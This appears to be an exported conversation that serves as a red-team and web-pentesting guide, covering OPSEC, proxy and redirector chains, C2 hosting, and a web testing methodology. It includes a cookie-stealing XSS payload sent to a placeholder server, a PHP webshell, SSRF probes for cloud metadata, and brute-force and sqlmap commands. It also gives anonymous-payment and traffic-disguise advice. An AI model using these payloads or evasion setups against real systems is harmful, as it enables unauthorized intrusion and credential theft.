# Red Team & Web Pentesting - Full Conversation

---

## Topic 1: Operational Security for Red Teaming

### 1. Separation of Identity
Never mix your real identity with red team infrastructure.
- Use dedicated machines or VMs — never your personal laptop
- Separate email accounts, phone numbers, and credentials for each engagement
- Use pseudonyms internally, but document real identities in your legal agreements
- Never reuse infrastructure across different clients

### 2. Infrastructure Management
- **Redirectors** — Never point tools directly at your C2 server. Use cloud instances (AWS, Azure, DO) as redirectors so if one burns, your main C2 survives
- **Domain aging** — Register domains weeks/months in advance; fresh domains are immediately suspicious
- **Categorize domains** — Use services like Cloudflare or domain categorization tools to make your domains look like legitimate businesses
- **Malleable C2 profiles** — Blend your C2 traffic into normal-looking HTTP/S traffic (e.g., mimic Microsoft CDN, Slack, or Office 365)

### 3. Attribution Avoidance
- **VPN/Proxy chains** — Layer your traffic. Direct connections from your home/office IP are a fast way to get caught and create legal exposure
- **Residential proxies** — More convincing than datacenter IPs for phishing and recon
- **Tor** — Useful for OSINT but too slow for active exploitation
- **Never log in to personal accounts** from red team infrastructure — even once

### 4. Tooling Hygiene
- **Custom implants over public tools** — Cobalt Strike, Metasploit, etc. have well-known signatures. Modify or write custom tooling
- **OPSEC-safe modules** — In CS/Sliver/Havoc, understand which modules touch disk, spawn processes, or make noise
- **Payload staging** — Avoid storing full payloads on disk; use stageless or in-memory execution
- **Clean metadata** — Strip EXIF data from phishing attachments, remove author info from Office docs

### 5. Communications Security
- Use end-to-end encrypted channels with your team and client (Signal, encrypted email)
- Establish a communication plan before the engagement: who to contact if things go sideways
- Have a get-out-of-jail letter (Rules of Engagement signed doc) accessible at all times

### 6. Logging & Documentation
- Log every action with timestamps — critical for deconfliction if a real incident occurs simultaneously
- Screenshot everything
- Use tools like Cobalt Strike's teamserver logs, Ghostwriter, or Pwndoc to track activity

### 7. Scoping & Legal Boundaries
- Written authorization must be crystal clear — IPs, domains, timeframes, excluded systems
- Confirm scope changes in writing before acting on them
- Know the emergency stop procedure — who calls it, how, and what happens
- Be aware of third-party systems in scope (cloud providers, SaaS)

### 8. Physical Red Teaming OpSec
- Cover stories (pretexting) must be rehearsed and believable
- Carry authorization letters + contact info for your client POC
- Dress the part — vendor, IT support, delivery, etc.
- Have an abort signal with your team if something feels wrong

---

## Topic 2: VPN & Proxy Setup for Red Team Operations

### The Layered Model
```
You → VPN → Proxy/Redirector → C2 Infrastructure → Target
```

### Step 1: Base Layer — VPN
- Use a paid, no-log VPN (Mullvad, ProtonVPN, IVPN)
- Pay with Monero or cash
- Never use free VPNs — they log and sell data

### Step 2: Cloud Redirectors
Spin up cheap VPS instances (DigitalOcean, Vultr, Linode) as your middle layer.
- These are expendable — burn and spin new ones when needed
- Use socat, iptables, or nginx for port forwarding

```bash
# Simple iptables redirector example
iptables -t nat -A PREROUTING -p tcp --dport 443 \
  -j DNAT --to-destination YOUR_C2_IP:443
iptables -t nat -A POSTROUTING -j MASQUERADE
```

### Step 3: Residential Proxies (for Phishing/OSINT)
- Route through real ISP addresses — much harder to block
- Use for: sending phishing emails, recon, credential stuffing
- Providers: Brightdata, Oxylabs, Smartproxy

### Step 4: SOCKS5 Proxies via SSH Tunnels
```bash
# Create a SOCKS5 proxy through an SSH jump host
ssh -D 1080 -N -f user@YOUR_REDIRECTOR_IP

# Then configure your tools
proxychains nmap -sT -Pn target.com
```

### When to Use What

| Scenario | What to Use |
|---|---|
| General browsing / recon | VPN only |
| Phishing emails | Residential proxy |
| Active exploitation | VPN → Cloud redirector → C2 |
| OSINT | VPN + Tor |
| Interactive shell / pivoting | SSH SOCKS5 tunnel |
| Scanning target | VPN → Redirector (never direct) |

### Proxychains Config
```ini
# /etc/proxychains.conf
dynamic_chain
proxy_dns

[ProxyList]
socks5 127.0.0.1 1080
socks5 PROXY2_IP 1080
```

### Leak Test Checklist
```bash
curl https://ifconfig.me          # Verify exit IP
curl https://whoami.akamai.net    # Check DNS leaks
curl -6 https://ifconfig.me       # Check IPv6 leakage
```

---

## Topic 3: Where to Host Your C2 Server

### The Golden Rule
```
Redirectors are public-facing. C2 is never directly exposed.
```

### Best Hosting Options

| Provider | Why It's Good |
|---|---|
| Vultr | Accepts crypto, many regions |
| DigitalOcean | Reliable, fast API for automation |
| Linode/Akamai | Less scrutinized than AWS |
| Hetzner | Cheap, European jurisdiction |

Always pay with **Monero (XMR)**. Sign up with a protonmail address over VPN.

### Architecture
```
Internet
    │
    ▼
Redirectors (Cloud/CDN VPS) ← Public-facing, expendable
    │
    ▼
C2 Server (VPS/Dedicated)   ← Hidden, never public
    │
    ▼
Team Server Access          ← You connect via VPN only
```

### C2 Server Hardening
```bash
ufw default deny incoming
ufw allow from REDIRECTOR_IP to any port 443
ufw allow from YOUR_VPN_IP to any port 50050
ufw enable
```
- Change default ports — 50050 for Cobalt Strike is instantly flagged
- Use SSH key auth only, disable password login
- Run C2 as a non-root user

### Jurisdiction Consideration
Host in: Iceland, Switzerland, Romania, Netherlands

### Practical Minimum Setup
```
1x Hetzner VPS (Finland)    → C2 server, firewall locked
2x DigitalOcean droplets    → Redirectors, expendable
1x Cloudflare account       → CDN fronting for HTTPS traffic
Mullvad VPN                 → How YOU connect to teamserver
```
Cost: ~$20–40/month total.

---

## Topic 4: Web Application Penetration Testing

### Methodology
```
Recon → Scanning → Enumeration → Exploitation → Post-Exploitation → Reporting
```

### Phase 1: Reconnaissance

#### Passive Recon
```bash
subfinder -d target.com
amass enum -passive -d target.com

# Google dorking
site:target.com filetype:pdf
site:target.com inurl:admin

waybackurls target.com | tee urls.txt
theHarvester -d target.com -b google
```

#### Tech Fingerprinting
```bash
whatweb target.com
curl -I target.com
```

### Phase 2: Scanning
```bash
nmap -sC -sV -p- target.com -oA scan_results
nikto -h https://target.com
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/big.txt
gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
```

### Phase 3: Core Vulnerabilities

#### 1. SQL Injection
```bash
# Manual test
https://target.com/item?id=1'

# Automated
sqlmap -u "https://target.com/item?id=1" --dbs
sqlmap -u "https://target.com/login" --data="user=admin&pass=test" --dbs
```

#### 2. Cross-Site Scripting (XSS)
```javascript
<script>alert(1)</script>
"><script>alert(1)</script>
<img src=x onerror=alert(1)>
<script>fetch('https://yourserver.com/?c='+document.cookie)</script>
```
Types: Reflected, Stored, DOM-based

#### 3. Broken Authentication
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com \
  http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```
Check: no rate limiting, predictable session tokens, session not invalidated on logout

#### 4. IDOR (Insecure Direct Object Reference)
```
GET /api/user/1234/profile  ← your account
GET /api/user/1235/profile  ← someone else's?
```
Always test with two accounts.

#### 5. File Upload Vulnerabilities
```bash
# PHP webshell
<?php system($_GET['cmd']); ?>

# Bypass techniques
# Double extension: shell.jpg.php
# Null byte: shell.php%00.jpg
```

#### 6. SSRF
```bash
?url=http://169.254.169.254/latest/meta-data/  # AWS metadata
?url=http://127.0.0.1/admin
?url=file:///etc/passwd
```

#### 7. Broken Access Control
```bash
GET /admin
GET /api/v1/admin/config
# Try changing role in JWT: "user" → "admin"
```

### Key Tools

| Tool | Purpose |
|---|---|
| Burp Suite | Intercept, modify, replay requests |
| ffuf / gobuster | Directory and parameter fuzzing |
| sqlmap | Automated SQL injection |
| nikto | Quick vulnerability scan |
| subfinder/amass | Subdomain enumeration |
| nuclei | Template-based vulnerability scanning |
| jwt_tool | JWT token manipulation |

### Burp Suite Workflow
1. Set browser proxy → 127.0.0.1:8080
2. Browse the app normally — build your sitemap
3. Identify all input points (forms, params, headers, cookies)
4. Send interesting requests to Repeater — manually test
5. Use Intruder for fuzzing/brute force
6. Check every response — status codes, lengths, timing

### Engagement Checklist
```
[ ] Subdomain enumeration
[ ] Directory bruteforce
[ ] All forms tested for XSS + SQLi
[ ] Auth — brute force, default creds, lockout policy
[ ] All IDs tested for IDOR
[ ] File upload tested
[ ] JWT / cookies analyzed
[ ] SSRF on URL parameters
[ ] API endpoints mapped and tested
[ ] Error messages reviewed for info disclosure
```

### Practice Labs
- HackTheBox — retired web machines
- TryHackMe — beginner friendly web paths
- PortSwigger Web Academy — best free resource, lab-based
- DVWA — run locally, deliberately vulnerable
- PentesterLab — structured web challenges

---
*Generated from conversation on Red Team OpSec & Web Pentesting*
